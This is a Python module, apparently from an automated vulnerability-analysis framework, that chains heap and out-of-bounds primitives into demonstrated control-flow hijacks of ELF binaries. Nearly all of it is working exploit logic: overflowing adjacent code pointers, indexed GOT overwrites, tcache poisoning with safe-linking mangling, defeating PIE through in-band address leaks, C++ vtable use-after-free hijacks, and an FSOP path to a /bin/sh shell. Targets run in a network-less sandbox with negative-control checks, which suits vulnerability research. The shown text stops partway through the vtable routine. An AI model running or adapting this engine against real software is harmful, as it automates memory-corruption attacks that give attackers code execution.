"""Primitive chaining: turn a discovered heap / out-of-bounds primitive into a DEMONSTRATED
control-flow hijack (L3), or an L2 exploitation recipe when a live win is not reachable.

The `heap_trace` (double-free / UAF / heap-overflow) and `oob_index` (CWE-129) stages discover a
memory-corruption PRIMITIVE but file a Finding that goes nowhere. This stage consumes that lead and
attempts to finish the chain: when the target has a reachable win function (a flag printer / shell
spawner, via `exploit.find_win`), it drives the primitive's menu option to overwrite an adjacent
CODE pointer with the win address, triggers the use, and CONFIRMS control reached the win under the
ptrace debugger -- with the same negative-control causation proof `build_exploit` uses. On success
it files an L3 `verified` poc; otherwise it emits the concrete `aaheg` technique + target recipe as
L2 analyst guidance. Native x86-64 / ELF; the live-confirm path is non-PIE (a PIE win needs a
leak, which stays analyst-gated). Deterministic. """
from __future__ import annotations

import logging
import re
import shutil
import struct
import sys
import tempfile
from pathlib import Path

from ... import observe
from ...jobs.registry import register_stage
from .. import substrate

_log = logging.getLogger(__name__)

# NOTE: cross-subpackage imports (..dynamic, ..fuzz, sibling poc modules) are done LAZILY inside the
# functions below -- importing at module load creates a poc <-> dynamic import cycle (poc.__init__
# imports this module, which would import dynamic.heap_discover, which imports back into poc).

CHAIN_STAGE = "chain_primitive"
TOOL_VERSION = "chain-1"
_NL = b"\n"
# What a win's output looks like -- a flag banner (NAME{...}), a literal /bin/sh, or a shell prompt
# at the start of a line -- so the PIE leak-chain confirms on the win actually RUNNING, not on
# incidental run-to-run noise. The bare case-insensitive `flag` and `$ ` tokens were dropped: they
# match far too much (any line containing "flag"/"flagged", any "$ " amount) and, while the positive
# vs negative-control differencing (pos_lines - neg_lines) usually cancels them, they are the one
# false-positive lever left when win and control output differ incidentally. The brace-banner shape
# already covers a real `flag{...}`; `^[#$] ` (multiline) is an actual shell prompt, not a token.
_WIN_OUT = re.compile(rb"[A-Za-z_][A-Za-z0-9_]{1,15}\{[^}\n]{2,}\}|/bin/sh|^[#$] ", re.I | re.M)
# CWE -> the aaheg vuln class the discovered primitive represents.
_VCLASS = {"CWE-415": "double_free", "CWE-416": "uaf", "CWE-122": "heap_overflow",
           "CWE-129": "oob_write",
           # A pointer WRITE computed from input is a write-what-where by another name, and an
           # indirect call through a field is the hijack this stage searches for -- the same two
           # routes the CWE-129 and CWE-122 leads take.
           "CWE-787": "oob_write", "CWE-822": "heap_overflow"}
#: Which detectors produce a lead worth chaining. Measured across 22 kept conformance stores:
#: `tainted_deref/CWE-787` ("writes through a pointer computed from input") stayed below
#: poc-backed 13 times out of 13, and `heap_fptr_call/CWE-822` ("indirect call through a function
#: pointer in an object field") 5 out of 5 -- every single occurrence. Both NAME the primitive this
#: stage exists to finish, and neither was ever read: the lead set was the two dynamic detectors,
#: so a static detector that found the exact shape of the bug could not hand it over. They are
#: tried last (`confidence` orders the leads, and a static candidate carries less), so a dynamic
#: lead still goes first and the only cost on a target with no real primitive is the searches'
#: own attempt caps.
_LEAD_DETECTORS = ("heap_trace", "oob_index", "tainted_deref", "heap_fptr_call")


def _p64(v: int) -> bytes:
    return struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)


def _drive_overflow(fields, payload: bytes, *, idx: bytes = b"1", num: bytes = b"999",
                    width=None) -> bytes:
    """One invocation of an option whose LAST string field carries the raw overflow `payload`
    (filler + the code address). A leading size field is driven large so the copy is unbounded."""
    from ..fuzz import menu
    last_str = max((i for i, f in enumerate(fields) if f == "str"), default=len(fields) - 1)
    out = bytearray()
    for i, f in enumerate(fields):
        if i == last_str:
            out += menu._data(payload, width)
        elif f == "idx":
            out += menu._scalar(idx, width)
        elif f == "num":
            out += menu._scalar(num, width)
        else:
            out += menu._data(b"AAAA", width)
    if not fields:                                       # option with no learned fields
        out += menu._data(payload, width)
    return bytes(out)


def _lead_finding(conn, target):
    """The discovered primitive to chain: the highest-confidence lead from any detector that names
    one (see `_LEAD_DETECTORS`). A DYNAMIC lead outranks a static one at equal confidence, because
    a traced use-after-free is a fact about this run and a pattern match is a fact about the code."""
    from ...db.dao import FindingDAO
    leads = [f for f in FindingDAO(conn).list_by_target(target.id)
             if f.detector in _LEAD_DETECTORS and f.cwe in _VCLASS]
    return max(leads, key=lambda f: (f.confidence, f.detector in ("heap_trace", "oob_index")),
               default=None)


def _recipe(vclass: str, win, target_bytes: bytes, glibc=None) -> dict:
    """An aaheg technique + concrete write target when a live hijack is not demonstrable. `glibc`
    (major, minor) gates the technique selection correctly (hooks removed in 2.34, safe-linking in
    2.32, double-free key in 2.29, House of Force only <2.29); without it the planner assumed a
    fixed modern version and mis-offered/omitted techniques for an old-libc target."""
    from . import aaheg
    env = aaheg.Env(glibc=glibc) if glibc else aaheg.Env()
    goal = (aaheg.Goal(kind="control_flow", value=(win[1] if win else 0),
                       trigger="overwrite a called code pointer with the win address")
            if win else aaheg.Goal(kind="arbitrary_write"))
    if vclass == "oob_write":
        # not a heap technique: the index escapes the array bounds -> write through the OOB slot
        return {"technique": "oob-index-write", "goal": goal.kind,
                "note": ("write a chosen value through the out-of-bounds array slot; aim it at a "
                         "saved return / GOT entry / function pointer, then trigger its use")}
    plan = aaheg.plan_exploit(aaheg.Vuln(vclass=vclass), goal, env=env)
    plan["technique"] = plan.get("technique") or (plan.get("advisory_alternatives") or [{}])[0].get(
        "technique", "tcache-poison")
    return plan


def chain_primitive_stage(ctx) -> dict:
    from ...db.dao import CallEdgeDAO, StringDAO, TargetDAO
    from ..dynamic import sandbox
    from ..dynamic.heap_discover import shared_op_model
    from ..fuzz import menu
    from . import exploit
    from .capture import make_capture, materialize_helper
    target = TargetDAO(ctx.conn).get(ctx.target_id) if ctx.target_id else None
    if target is None:
        raise ValueError("chain_primitive requires a target_id")
    host = sandbox.host_arch()
    _what = "primitive chaining"
    why = (substrate.foreign_cpu_reason(target.arch, target.file_type, host, _what)
           or substrate.native_only_reason(target.file_type, _what))
    if why:
        ctx.emit("chain.done", payload={"applicable": False, "note": why})
        return {}

    lead = _lead_finding(ctx.conn, target)
    if lead is None:
        ctx.emit("chain.done", payload={"applicable": False,
                 "note": "no heap / out-of-bounds primitive discovered to chain"})
        ctx.progress(pct=100, msg="no primitive lead to chain")
        return {}
    vclass = _VCLASS[lead.cwe]

    target_bytes = ctx.content.path(target.sha256).read_bytes()
    from . import rop
    from .exploit_stage import _libc_bytes_for
    _glibc = rop.libc_version(_libc_bytes_for(ctx, target) or b"")   # gate heap techniques by version
    functions = exploit.elf_functions(target_bytes)
    edges = CallEdgeDAO(ctx.conn).list_by_target(target.id)
    win = exploit.find_win(functions, call_edges=edges)
    win = win if win[0] else None
    pie = (target.mitigations or {}).get("pie") == "on"

    # Without a reachable win, a HIJACK has nothing to point at -- but an arbitrary WRITE does not
    # need one. A write-what-where plus the arbitrary read that comes with it leaks the libc base
    # out of a GOT slot and forges a FILE, so exit() calls system("/bin/sh"): no win function, no
    # system() in the PLT, ASLR left on. That whole class used to stop here at an L2 recipe saying
    # a leak-based chain was analyst work.
    # A PIE image is still a hard stop for THIS route (the GOT slot and the array it writes
    # through are only addressable once the image base is known); the win-based ladder below
    # recovers a PIE base from an in-band leak instead.
    if win is None:
        if vclass == "oob_write" and not pie:
            staged = _stage_and_crawl(ctx, target, exe_dir=None)
            if staged:
                wd, exe_p, opts_p, model_p, width_p = staged
                try:
                    got = _www_shell(ctx, target, target_bytes, lead, vclass,
                                     exe=exe_p, opts=opts_p, model=model_p, width=width_p)
                finally:
                    shutil.rmtree(wd, ignore_errors=True)
                if got:
                    return got
        recipe = _recipe(vclass, win, target_bytes, glibc=_glibc)
        why = "no reachable win function (a leak-based libc/one-gadget chain is analyst-gated)"
        _file_recipe(ctx, target, lead, vclass, win, recipe, why)
        ctx.emit("chain.done", payload={"applicable": True, "confirmed": False, "vclass": vclass,
                 "win": None, "recipe": recipe.get("technique"), "note": why})
        ctx.progress(pct=100, msg=f"L2 recipe for {vclass} (live hijack not demonstrable: {why})")
        return {"metrics": {"chained": False, "vclass": vclass}}

    win_name, win_addr = win
    workdir = Path(tempfile.mkdtemp(prefix="lykos-chain-"))
    sandbox.protect_dir(getattr(ctx.content, "root", None))
    try:
        exe = workdir / "target.bin"
        ctx.content.stage_target(target, exe.parent, exe.name)
        exe.chmod(0o755)
        strings = [x.value for x in StringDAO(ctx.conn).list_by_target(target.id)
                   if getattr(x, "value", None)]
        opts = menu.detect_menu(strings)
        width, model = shared_op_model(ctx, target, workdir, exe, opts)   # fixed-width + crawl, shared

        if pie:
            # PIE: the win address is only known at runtime. Recover the base from an in-band leak
            # and relocate the overwrite in the SAME process (an honest ASLR defeat), confirmed by
            # the win's output under a negative control.
            hit = _pie_leak_chain(ctx, target_bytes, exe, win, opts, model, width, workdir)
            if hit:
                leak_opt, writer, off, trig, base = hit
                return _file_pie_l3(ctx, target, lead, vclass, win_name, win_vaddr=win_addr,
                                    leak_opt=leak_opt, writer=writer, off=off, trig=trig)
            recipe = _recipe(vclass, win, target_bytes, glibc=_glibc)
            _file_recipe(ctx, target, lead, vclass, win, recipe,
                         "PIE: no in-band leak recovered the image base (leak-chain not confirmed)")
            ctx.emit("chain.done", payload={"applicable": True, "confirmed": False,
                     "vclass": vclass, "win": win_name, "note": "PIE leak-chain not confirmed"})
            ctx.progress(pct=100, msg=f"PIE {vclass}: no in-band leak to relocate {win_name}")
            return {"metrics": {"chained": False, "vclass": vclass, "pie": True}}

        helper = materialize_helper()
        capture = make_capture(ctx, helper, str(exe), "stdin", [], 8, sys.executable)
        try:
            if vclass in ("double_free", "uaf"):
                # C++ UAF -> vtable hijack: overwrite the freed object's vtable pointer with an
                # inline fake table so the dangling virtual call dispatches to win. Tried first for a
                # C++ target, whose empty menu crawl gives tcache-poison's role lookup nothing.
                vt = _cpp_vtable_uaf(ctx, target, target_bytes, exe, functions, edges, win, opts,
                                     model, width, workdir, capture)
                if vt:
                    seq, new_o, free_o, edit_o, show_o, chunk, size = vt
                    return _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq,
                                    blame=(f"UAF vtable hijack: option {edit_o} overwrites the freed "
                                           f"object's vtable pointer (inline fake table at "
                                           f"{hex(chunk + 8)}), option {show_o}'s virtual call "
                                           f"dispatches to &{win_name}"),
                                    writer=edit_o, off=None, trig=show_o, exe=exe)
                # tcache-poison: free -> UAF-overwrite fd -> alloc a chunk over a code ptr
                tc = _tcache_chain(ctx, target, target_bytes, exe, functions, edges, win, opts,
                                   model, width, workdir, capture, glibc=_glibc)
                if tc:
                    seq, tgt, trig = tc
                    return _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq,
                                    blame=f"tcache-poison chunk over {hex(tgt)}", writer=trig,
                                    off=None, trig=trig, exe=exe)
            else:
                # CWE-129/787 indexed write -> write-what-where on a GOT slot / fn-pointer. The
                # index selects the address, so the target can be the whole GOT, not just a byte
                # offset inside the array (what _search_hijack walks below).
                if vclass == "oob_write":
                    ow = _oob_write_hijack(ctx, capture, target_bytes, exe, opts, model, win_addr,
                                           width=width)
                    if ow:
                        seq, writer, idx, tgt_addr, trig, tgt_name = ow
                        return _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq,
                                        blame=(f"option {writer} writes index {idx} "
                                               f"({tgt_name} at {hex(tgt_addr)}) := &{win_name}"),
                                        writer=writer, off=None, trig=trig, exe=exe)
                # heap overflow / oob write -> overwrite an adjacent code pointer directly.
                # Every PRIMER in turn, not one: `menu.alloc_primers` supplies the default pair of
                # objects and, for a count-taking creator, the wrap thresholds that make the
                # allocation UNDERSIZED -- which is the only state in which an integer overflow
                # has an overflow to find at all.
                alloc = next((o for o in opts if o in model and menu._is_alloc(model[o])), None)
                writers = [o for o in opts if o in model and "str" in model[o]] or opts
                for i, prime in enumerate(menu.alloc_primers(model, alloc, width) or [b""]):
                    found = _search_hijack(ctx, capture, prime, model, writers,
                                           list(opts) + [None], win_addr, width=width)
                    if not found:
                        continue
                    seq, writer, off, trig = found
                    # Say WHY the overflow was possible when the answer is the primer: a wrap
                    # primer means the allocation was undersized by its own size arithmetic, and
                    # a report that omits that names the consequence without the defect.
                    undersized = ("; the allocation was undersized first -- option "
                                  f"{alloc}'s count wrapped the size computation (CWE-190), which "
                                  "is what gives the copy anything to run past" if i else "")
                    return _file_l3(ctx, target, lead, vclass, win_name, win_addr, seq,
                                    blame=(f"option {writer} overwrites a code pointer at +{off}"
                                           + undersized),
                                    writer=writer, off=off, trig=trig, exe=exe)
        finally:
            shutil.rmtree(helper.parent, ignore_errors=True)

        # A win exists but nothing reached it. For an arbitrary write that is not the end of the
        # road: the FSOP route needs no win at all.
        if vclass == "oob_write":
            got = _www_shell(ctx, target, target_bytes, lead, vclass,
                             exe=exe, opts=opts, model=model, width=width)
            if got:
                return got
        recipe = _recipe(vclass, win, target_bytes, glibc=_glibc)
        _file_recipe(ctx, target, lead, vclass, win, recipe,
                     f"drove {vclass} but control never reached {win_name}")
        ctx.emit("chain.done", payload={"applicable": True, "confirmed": False,
                 "vclass": vclass, "win": win_name})
        ctx.progress(pct=100, msg=f"{vclass} chain to {win_name} not confirmed (L2 recipe)")
        return {"metrics": {"chained": False, "vclass": vclass}}
    finally:
        shutil.rmtree(workdir, ignore_errors=True)


def _pie_spawn(workdir, exe):
    """A fresh sandboxed interactive process for the PIE leak-then-chain driver."""
    import subprocess

    from ..dynamic import sandbox

    # isolate_prefix's first argument is the exe DIRECTORY it ro-binds so bwrap can exec the
    # target. Pass the exe's own directory, not workdir: production happens to place the exe inside
    # workdir, but a caller with the two apart (e.g. a prebuilt fixture) would otherwise leave the
    # binary unbound and bwrap fails with `execvp ...: No such file or directory`. workdir stays a
    # rw bind for the target's own writes / cwd.
    exedir = str(Path(exe).resolve().parent)
    def spawn():
        cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[str(workdir)]) + [str(exe)]
        return subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, cwd=str(workdir),
                                preexec_fn=sandbox._rlimits(2048, 20, set_as=False))
    return spawn


def _pie_drain(proc, idle=0.25, total=3.0):
    """Read a process's output until it stalls waiting for input, exits, or `total` elapses."""
    import os
    import select
    import time
    buf, end = b"", time.time() + total
    while time.time() < end:
        r, _, _ = select.select([proc.stdout], [], [], idle)
        if r:
            try:
                chunk = os.read(proc.stdout.fileno(), 4096)
            except OSError:
                break
            if not chunk:
                break
            buf += chunk
        elif proc.poll() is not None:
            break
        else:
            return buf, True                             # stalled: awaiting input
    return buf, (proc.poll() is None)


def _pie_run(spawn, width, leak_opt, writer, off, trig, win_vaddr, target_bytes, *, corrupt):
    """One in-process leak-then-chain run (an honest ASLR defeat -- the leak and the overwrite
    happen in the SAME process): drive the leak option, recover the base from what it discloses,
    overwrite an adjacent code pointer with base+win_vaddr (or a corrupted value for the negative
    control), trigger, and return (base, trigger_output). base is None when the leak did not
    recover a base."""
    from ..fuzz import menu
    from . import exploit
    proc = spawn()
    try:
        _pie_drain(proc)                                 # first menu
        proc.stdin.write(menu._scalar(leak_opt.encode(), width)); proc.stdin.flush()
        out, _ = _pie_drain(proc)
        vals = [int(x, 16) for x in re.findall(rb"0x[0-9a-fA-F]+", out)]
        base = exploit.recover_pie_base(vals, target_bytes) if vals else None
        if not base:
            return None, b""
        addr = (base + win_vaddr) if not corrupt else (base + win_vaddr) ^ 0xFFFF
        proc.stdin.write(menu._scalar(writer.encode(), width)); proc.stdin.flush()
        _pie_drain(proc)
        proc.stdin.write(b"A" * off + _p64(addr)); proc.stdin.flush()   # overflow the code pointer
        _pie_drain(proc)
        if trig is not None:
            proc.stdin.write(menu._scalar(trig.encode(), width)); proc.stdin.flush()
        tout, _ = _pie_drain(proc)
        return base, tout
    except (BrokenPipeError, OSError):
        return None, b""
    finally:
        # Close the pipes BEFORE killing: a half-filled stdin buffer finalised after the process
        # is gone raises an unraisable BrokenPipeError no `except` here can catch.
        from ..dynamic import sandbox as _sb
        _sb.kill_quietly(proc)


def _pie_leak_chain(ctx, target_bytes, exe, win, opts, model, width, workdir):
    """PIE control-flow hijack via an in-band leak: find the option that discloses a recoverable
    image base, then overwrite an adjacent code pointer with base+win_vaddr and confirm the win
    RUNS (its output appears) -- gated by a negative control (a corrupted address must NOT win).
    Returns (leak_opt, writer, off, trig, base) or None. Marker-confirmed (no ptrace), because the
    leak+overwrite must share one live process to defeat real ASLR."""
    win_name, win_vaddr = win
    spawn = _pie_spawn(workdir, exe)
    leak_opt = next((o for o in opts
                     if _pie_run(spawn, width, o, o, 8, None, win_vaddr, target_bytes,
                                 corrupt=False)[0]), None)
    if leak_opt is None:
        return None
    writers = [o for o in opts if o in model and "str" in model[o]] or list(opts)
    triggers = list(opts) + [None]
    attempts = 0
    for writer in writers:
        for off in range(8, 72, 8):
            for trig in triggers:
                if ctx.should_cancel() or attempts >= 220:
                    return None
                attempts += 1
                base, pos = _pie_run(spawn, width, leak_opt, writer, off, trig, win_vaddr,
                                     target_bytes, corrupt=False)
                if not base:
                    continue
                pos_lines = {ln for ln in pos.splitlines() if ln.strip()}
                # A win-only line that also LOOKS like a win (a flag banner / shell), so leaked-
                # pointer noise that merely differs run-to-run is not mistaken for success.
                if not any(_WIN_OUT.search(ln) for ln in pos_lines):
                    continue
                _, neg = _pie_run(spawn, width, leak_opt, writer, off, trig, win_vaddr,
                                  target_bytes, corrupt=True)
                neg_lines = {ln for ln in neg.splitlines() if ln.strip()}
                won = [ln for ln in pos_lines - neg_lines if _WIN_OUT.search(ln)]
                if won:
                    ctx.progress(msg=f"PIE hijack: leak {leak_opt} -> base -> option {writer} "
                                     f"writes base+{win_vaddr:#x} at +{off} -> {win_name} ran")
                    return leak_opt, writer, off, trig, base
    return None


def _oob_write_seq(writer, fields, idx, value, trig, model, width) -> bytes:
    """Drive ONE indexed write: select `writer`, supply `idx` for its index field and `value` for
    its value field (menu._fill types each field), then optionally fire `trig` to force the call
    through the overwritten slot. The value is sent as a decimal (a `scanf("%ld")`/atoi value cell)
    -- the dominant CWE-129 write-a-cell shape; a raw-byte value cell is covered by the sequential
    _search_hijack path."""
    from ..fuzz import menu
    drive = menu._scalar(writer.encode(), width) + menu._fill(
        fields, idx=str(idx).encode(), num=str(value).encode(), width=width)
    if trig is None:
        return drive
    return drive + menu._scalar(trig.encode(), width) + menu._fill(model.get(trig, []), width=width)


def _oob_write_hijack(ctx, capture, target_bytes, exe, opts, model, win_addr, *, width=None):
    """CWE-129/787 unchecked indexed write -> control-flow hijack (a write-WHAT-WHERE, not a
    sequential overflow). A menu option computes `arr[idx] = value` with no bound check on `idx`;
    choosing `idx` so `arr_base + idx*stride` lands on a GOT slot (or a called-through global
    function pointer) and `value = win_addr` overwrites that pointer, so the next call through it
    enters win. _search_hijack walks byte offsets in one buffer; here the INDEX is the address
    selector, so the whole GOT (and writable fn-pointers) are reachable, well outside the array.

    Searches (array, write option, target slot, trigger). Confirm = the win breakpoint is hit AND a
    negative control (value replaced with a benign address) does NOT hit it, proving the overwrite
    -- not incidental flow -- caused arrival. Returns (seq, writer, idx, target_addr, trig, name)
    or None. Bounded; early-exits on the first confirmed hijack. Non-PIE (absolute GOT/global
    addresses); a PIE target's indexed write is handled by the leak-relocating _pie_leak_chain."""
    from ..dynamic import oob_index
    from . import exploit, rop

    arrays = (oob_index._array_candidates(exploit.elf_objects_sized(target_bytes))
              or oob_index._array_candidates_symfree(Path(exe)))
    if not arrays:
        return None

    # arbitrary-write targets: every GOT slot (overwriting it redirects that libc call), ordered so
    # the functions a menu loop re-calls come first -- their call is the implicit next-prompt
    # trigger, so a hijack confirms with trig=None and the search stays short. Writable global
    # function pointers referenced by the code are appended as secondary targets.
    got = rop.got_entries(target_bytes)
    _HOT = ("printf", "puts", "fwrite", "fflush", "putchar", "fputs", "__printf_chk",
            "fgets", "scanf", "__isoc99_scanf", "read", "write")
    got_targets = sorted(got.items(),
                         key=lambda kv: (_HOT.index(kv[0]) if kv[0] in _HOT else 99, kv[0]))
    targets = [(a, f"{n}@got") for n, a in got_targets]
    targets += [(a, f"fnptr@{a:x}") for a in _writable_globals(exe) if a not in got.values()]
    if not targets:
        return None

    # write options: an option whose template reads an index AND at least one more scalar (the value
    # cell). Fall back to any index-taking option (the crawl may have learned only the index field).
    writers = [o for o in opts if o in model and "idx" in model[o] and len(model[o]) >= 2] or \
              [o for o in opts if o in model and "idx" in model[o]]
    if not writers:
        return None
    triggers = [None] + [o for o in opts if o in model][:3]

    attempts = 0
    for arr in arrays:
        base, stride, cap = arr["addr"], arr.get("stride", 8), arr["cap"]
        for tgt_addr, tgt_name in targets:
            if stride <= 0 or (tgt_addr - base) % stride:
                continue
            idx = (tgt_addr - base) // stride
            if not (-(cap + 4096) <= idx <= cap + 4096):     # a plausibly-unchecked index, bounded
                continue
            for writer in writers:
                fields = model[writer]
                for trig in triggers:
                    if ctx.should_cancel() or attempts >= 240:
                        return None
                    attempts += 1
                    seq = _oob_write_seq(writer, fields, idx, win_addr, trig, model, width)
                    if not exploit.reached(capture(seq, breakpoints=[win_addr]), win_addr):
                        continue
                    neg = _oob_write_seq(writer, fields, idx, win_addr ^ 0xFFFF, trig, model, width)
                    if exploit.reached(capture(neg, breakpoints=[win_addr]), win_addr):
                        continue                             # reached without our value -> not ours
                    ctx.progress(msg=f"indexed-write hijack: option {writer} sets "
                                     f"{arr['name']}[{idx}] ({tgt_name}) := win -> win reached")
                    return seq, writer, idx, tgt_addr, trig, tgt_name
    return None


def _search_hijack(ctx, capture, prime, model, writers, triggers, win_addr, *, width=None):
    """Overwrite an adjacent code pointer with `win_addr` and confirm the trigger calls it.

    Search the (writer option, overwrite offset, trigger option) space: place win_addr at each
    8-byte offset of an over-long payload from a data-writing option, then drive each candidate
    trigger. Confirm = the win breakpoint is hit AND a negative control (win bytes replaced) does
    NOT hit it, proving the overwrite caused arrival. Bounded; early-exits on the first hijack."""
    from ..fuzz import menu
    from . import exploit
    attempts = 0
    for writer in writers:
        wf = model.get(writer, [])
        for widx in (b"0", b"1"):                        # object whose buffer we overflow
            for off in range(8, 72, 8):
                drive = menu._scalar(writer.encode(), width) + _drive_overflow(
                    wf, b"A" * off + _p64(win_addr), idx=widx, width=width)
                for trig in triggers:
                    # the object the trigger uses: usually the one ADJACENT to the overflow.
                    for tidx in ((None,) if trig is None else (b"1", b"0")):
                        if ctx.should_cancel() or attempts >= 260:
                            return None
                        attempts += 1
                        tail = b"" if trig is None else (
                            menu._scalar(trig.encode(), width)
                            + menu._fill(model.get(trig, []), idx=tidx, width=width))
                        seq = prime + drive + tail
                        if not exploit.reached(capture(seq, breakpoints=[win_addr]), win_addr):
                            continue
                        neg = prime + menu._scalar(writer.encode(), width) + _drive_overflow(
                            wf, b"A" * off + b"C" * 8, idx=widx, width=width) + tail
                        if exploit.reached(capture(neg, breakpoints=[win_addr]), win_addr):
                            continue                     # reached without the overwrite -> not ours
                        ctx.progress(msg=f"hijack: option {writer} (obj {widx.decode()}) writes "
                                         f"a code pointer at +{off} -> win reached")
                        return seq, writer, off, trig
    return None


# ------------------------------------------------------- live tcache-poisoning (double-free / UAF)
def _writable_globals(exe) -> list[int]:
    """16-aligned writable-global addresses referenced by the code -- candidate function-pointer
    targets to allocate a chunk over. 16-aligned because glibc 2.32+ rejects an unaligned tcache
    chunk. Both an absolute displacement and objdump's computed `# <vaddr>` (PIE) are read."""
    import subprocess

    from ..dynamic.oob_index import _data_ranges
    try:
        out = subprocess.run(["objdump", "-d", "--no-show-raw-insn", "-M", "intel", str(exe)],
                             capture_output=True, text=True, timeout=60).stdout
    except (OSError, subprocess.SubprocessError):
        return []
    ranges = _data_ranges(exe)

    def in_data(a):
        return any(s <= a < e for s, e in ranges)

    seen = set()
    for m in re.finditer(r"(?:\+0x([0-9a-fA-F]+)\]|#\s*([0-9a-fA-F]+)\b)", out):
        a = int(m.group(1) or m.group(2), 16)
        if a % 16 == 0 and in_data(a):
            seen.add(a)
    return sorted(seen)[:12]


def _trace_alloc(ctx, exe, alloc_info, drive: bytes, width, workdir) -> tuple:
    """Run the drive under the heaptrace ptrace helper and return the FIRST allocation as
    (chunk_address, requested_size), or (None, None). Deterministic under ASLR-off. Runs the helper
    DIRECTLY (via ctx.run_subprocess, like make_capture) rather than under bwrap, so the heap layout
    matches the capture() runs the exploit is confirmed under -- and so a C++ target (whose bwrap
    sandbox may lack libstdc++) is still traced."""
    import json

    from ..dynamic import heap_discover
    plt = bool(alloc_info.get("plt"))
    ret_offs = [] if plt else heap_discover._alloc_ret_offsets(exe, alloc_info["alloc_name"])
    helper = workdir / "heaptrace.py"
    if not helper.exists():
        helper.write_bytes((Path(heap_discover.__file__).with_name("heaptrace.py")).read_bytes())
    report = workdir / "areport.json"
    report.unlink(missing_ok=True)
    (workdir / "aspec.json").write_text(json.dumps({
        "exe": str(exe), "stdin": drive.hex(), "free_off": alloc_info["free"],
        "alloc_off": alloc_info["alloc"], "alloc_ret_offs": ret_offs, "alloc_is_plt": plt,
        "pie": False, "ignore_ranges": [], "report": str(report), "timeout": 6}))
    try:
        ctx.run_subprocess([sys.executable, str(helper), str(workdir / "aspec.json"),
                            str(report)], timeout=12)
        rep = json.loads(report.read_text())
        addrs, sizes = rep.get("alloc_addrs") or [], rep.get("alloc_sizes") or []
    except Exception:
        observe.absorbed(_log, "falling back")
        return None, None
    if not addrs:
        return None, None
    return int(addrs[0], 16), (int(sizes[0]) if sizes else None)


def _trace_first_alloc(ctx, exe, alloc_info, drive: bytes, width, workdir) -> int | None:
    """The FIRST chunk address a drive allocates (the safe-linking fd mangle needs it); size-less
    wrapper over _trace_alloc for the tcache-poison caller."""
    return _trace_alloc(ctx, exe, alloc_info, drive, width, workdir)[0]


def _tcache_chain(ctx, target, target_bytes, exe, functions, edges, win, opts, model, width,
                  workdir, capture, glibc=None):
    """Drive a live tcache-poisoning chain: free a chunk, overwrite its fd (via the UAF/double-free)
    with a mangled pointer to a code-pointer target, allocate twice to obtain a chunk AT the target,
    write the win address there, and trigger. Confirms control reached the win under the debugger,
    with a negative control. ASLR-off makes the chunk address (hence the safe-linking mangle)
    deterministic. Returns (sequence, target, trigger) on success, else None."""
    from ..dynamic import heap_discover, heaptrace
    from ..fuzz import menu
    from . import exploit
    # Safe-linking (the tcache fd mangle `(addr>>12)^fd`) landed in glibc 2.32. Mangling on a
    # PRE-2.32 target produces a wrong fd and the poison silently never confirms -- the bug the
    # audit found (the computed glibc version was dropped before this chain). Mangle only when the
    # target's glibc is >= 2.32, or when the version is unknown (modern default, fail toward the
    # common case). `glibc` is (major, minor) from rop.libc_version, or None.
    safe_linking = glibc is None or (isinstance(glibc, tuple) and tuple(glibc) >= (2, 32))
    alloc_info = heaptrace.identify_allocator(functions, edges) or heap_discover._libc_plt_pair(exe)
    if not alloc_info:
        return None
    alloc_opt = next((o for o in opts if o in model and "num" in model[o]), None)
    free_opt = next((o for o in opts if o in model and model[o] == ["idx"]), None)
    edit_opt = next((o for o in opts if o in model and model[o][:1] == ["idx"]
                     and "str" in model[o]), None)
    if not (alloc_opt and free_opt and edit_opt):
        return None
    targets = _writable_globals(exe)
    if not targets:
        return None
    win_name, win_addr = win

    def _op(opt, num=None):                               # an alloc/menu option, size = num
        return menu._scalar(opt.encode(), width) + menu._fill(
            model[opt], num=(str(num).encode() if num is not None else b"16"), width=width)

    def _idx_op(opt, idx):                                # a free option on index `idx`
        return menu._scalar(opt.encode(), width) + menu._scalar(str(idx).encode(), width)

    def _edit(idx, payload, pad):                         # edit index `idx`, write raw `payload`
        return (menu._scalar(edit_opt.encode(), width) + menu._scalar(str(idx).encode(), width)
                + menu._data(payload.ljust(pad, b"\x00"), width))

    # the freed chunk's address (for the safe-linking mangle): trace one allocation.
    a = _trace_first_alloc(ctx, exe, alloc_info, _op(alloc_opt, 24) + _idx_op("9", 0),
                           width, workdir)
    if not a:
        return None

    for size in (24, 16, 40):
        for pad in (size, 24, 32):
            for tgt in targets:
                if ctx.should_cancel():
                    return None
                mangled = ((a >> 12) ^ tgt) if safe_linking else tgt   # safe-linking: glibc >= 2.32
                poison = (_op(alloc_opt, size) + _idx_op(free_opt, 0) + _edit(0, _p64(mangled), pad)
                          + _op(alloc_opt, size) + _op(alloc_opt, size)
                          + _edit(2, _p64(win_addr), pad))
                for trig in opts:
                    seq = poison + _idx_op(trig, 0)
                    if not exploit.reached(capture(seq, breakpoints=[win_addr]), win_addr):
                        continue
                    neg = (_op(alloc_opt, size) + _idx_op(free_opt, 0)
                           + _edit(0, _p64(mangled), pad)
                           + _op(alloc_opt, size) + _op(alloc_opt, size)
                           + _edit(2, _p64(0xdead), pad) + _idx_op(trig, 0))
                    if exploit.reached(capture(neg, breakpoints=[win_addr]), win_addr):
                        continue                          # reached without our write -> not ours
                    ctx.progress(msg=f"tcache-poison: chunk over {hex(tgt)} -> {win_name} "
                                     f"(size {size}, trigger {trig})")
                    return seq, tgt, trig
    return None


def _is_cpp_heap(target_bytes) -> bool:
    """The target allocates C++ objects: its PLT imports `operator new` AND `operator delete`
    (_Znwm/_Znam paired with _ZdlPv*/_ZdaPv*). A polymorphic such object carries a vtable pointer at
    offset 0 -- the thing a use-after-free lets us overwrite."""
    from . import rop
    got = rop.got_entries(target_bytes)
    return (any(n in got for n in ("_Znwm", "_Znam"))
            and any(n in got for n in ("_ZdlPv", "_ZdlPvm", "_ZdaPv", "_ZdaPvm")))


def _cpp_vtable_uaf(ctx, target, target_bytes, exe, functions, edges, win, opts, model, width,
                    workdir, capture):
    """C++ use-after-free -> vtable hijack. A freed polymorphic object keeps a dangling reference; a
    later write reclaims (or writes straight through) the chunk and replaces its vtable POINTER
    (object offset 0), so the next virtual call dispatches through an attacker vtable to win.

    The reclaimed chunk address is deterministic under ASLR-off, so we build the fake vtable INLINE
